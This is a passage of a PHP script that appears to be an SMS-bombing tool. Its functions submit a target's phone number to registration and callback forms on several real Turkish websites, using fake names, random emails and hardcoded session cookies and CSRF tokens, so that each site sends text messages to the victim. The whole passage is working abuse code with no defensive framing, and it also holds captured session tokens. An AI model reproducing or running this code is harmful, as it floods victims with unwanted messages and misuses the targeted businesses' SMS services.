curl_setopt($ch, CURLOPT_COOKIE, 'ARRAffinity=39d91f16fdd59b39d7a07780844d80b88a73a7f54a8a5e7eeddb8cc0cb631057; ARRAffinitySameSite=39d91f16fdd59b39d7a07780844d80b88a73a7f54a8a5e7eeddb8cc0cb631057; cookiesession1=678A3E272BAF9DDA7033D17311540D21; _SI_VID_1.bf37aae48800011b514bea39=179c62636b22d93c470848f2; _SI_DID_1.bf37aae48800011b514bea39=558a2937-5c32-3e62-966d-10c8a69e897a; userToken=9dee4197-00ca-45d7-9fb2-8f3c0f3be269; MoneyclubKartWeb=CfDJ8Nhpx3mYLppEuwVMXp9IBf3d980VUAiD0RrgmXMYG1%2BAPkRsIG1RdOcxhGCdZMXeGn3JfChrDlsyxUcqUBK%2BWm6bgYQe4cTOfAuH1j2hVn7im%2Fq5Db8s3Juge0khxAnPN43ml5u6XoK9KyJN2iRMpFBr5uKp0e%2FCCRYgxZeWB3Tc; .AspNetCore.Antiforgery.9fXoN5jHCXs=CfDJ8Nhpx3mYLppEuwVMXp9IBf3OJvL3AlPODaoBUTCyxS3MahvcS6jBLHFHX9xPsLyUxSzijlnnRjkIU2pAOa3G6WGAiVcxtnskDrLYQ2iiEzB7Nb463tlw-gLLyAsaPrbLCeY5kJ9TvFE8Oz94VOy7NvI; _SI_SID_1.bf37aae48800011b514bea39=3ba4e9fca98df8533a888fe3.1701000799274.8304');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ProcessId=188CE118-A677-4AB1-8391-7AA21BE85B3A&CardNumber=&FirstName=methmedd&LastName=ensa&Phone='. $gsm .'&BirthDate=10.12.1991&Gender=E&Email=' . $randomEmail . '&CityId=05&TermsOfUseAccepted=true&MoneyElectronicContactPermissionAccepted=true&__RequestVerificationToken=CfDJ8Nhpx3mYLppEuwVMXp9IBf34-_heX0fXtj96TRaRaEhW0BtsYATy17OUGJhSg3m8U8Jw9hzv9yJSp8zDnpT3FgNLhqT8YLEh9haqXHynv3uyLG29XftjSjqbW7j112bvxXTBgpWhAoR15-GeX_yPs10&TermsOfUseAccepted=false&MoneyElectronicContactPermissionAccepted=false');
$response = curl_exec($ch);
curl_close($ch);
}

function mavi($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.mavi.com/register/newcustomer');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.mavi.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.8',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.mavi.com',
    'referer: https://www.mavi.com/register',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'JSESSIONID=E80B900E59A8AB7AB2D757B8159E0FAB.accstorefront-79b66b79-zkkn8; ROUTE=.accstorefront-79b66b79-zkkn8');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'firstName=Ylmaz&lastName=Gl&phoneNumber='. $gsm .'&day=03&month=04&year=1996&gender=MALE&eMail=' . $randomEmail . '&password=Skidlamer123!&confirmPassword=Skidlamer123!&smsPermission=true&emailPermission=true&acceptAgreement=false&CSRFToken=073458e9-b329-481c-82c6-57632800422b');
$response = curl_exec($ch);
curl_close($ch);
}

function subaru($gsm){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://subaru.com.tr/Form/VerifyToCRM');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: subaru.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://subaru.com.tr',
    'referer: https://subaru.com.tr/subaru-electric-community',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, '.AspNetCore.Antiforgery.KG13AUBbHo8=CfDJ8LXkVrtzMsBOr7dwStENiaKt4JR7kYf7-N_BTXQS1z1qFR3jQj5pM6v6NCoYnVyCz9evP_5vnSDykjcDKjnvo3Ro8v06M4kaaAaJUgeOZrQrzGmWMEZSVk3eAFlQWXwRjlu0NpYtLg-XO9uyMvPZTrY');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'Code=MA160105&Phone=0'. $gsm .'&val1=Positive&val2=Positive&val3=Negative&val4=Negative');
$response = curl_exec($ch);
curl_close($ch);
}

function erdeger($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.erdeger.com.tr/mail.php?type=bizSiziArayalim');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.erdeger.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9',
    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryRc1vDbq4uDXjxqtT',
    'origin: https://www.erdeger.com.tr',
    'referer: https://www.erdeger.com.tr/biz-sizi-arayalim',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=q81rqpacrcok3rk03md85q0c17');
curl_setopt($ch, CURLOPT_POSTFIELDS, "------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"adsoyad\"\r\n\r\nmeth Yilmaz\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"telefon\"\r\n\r\n'. $gsm .'\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n'. $randomEmail .'\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"marka\"\r\n\r\nİkinci El\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"departman\"\r\n\r\nİkinci El Araç\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"sehir\"\r\n\r\nYalova\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"not\"\r\n\r\n\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"onay\"\r\n\r\n1\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT\r\nContent-Disposition: form-data; name=\"traffic\"\r\n\r\nhttps://www.google.com/\r\n------WebKitFormBoundaryRc1vDbq4uDXjxqtT--\r\n");
$response = curl_exec($ch);
curl_close($ch);
}

header('Content-Type: application/json');
echo json_encode($response);
 

// Rastgele e-posta üreten fonksiyon
function generateRandomEmail() {
    $randomString = substr(md5(rand()), 0, 7);
    return $randomString . "@example.com";
}

// SMS gönderimi yapılıyor
$response = sendSMS($gsm);

// Sonuç döndürülüyor
echo json_encode($response);
exit;
?>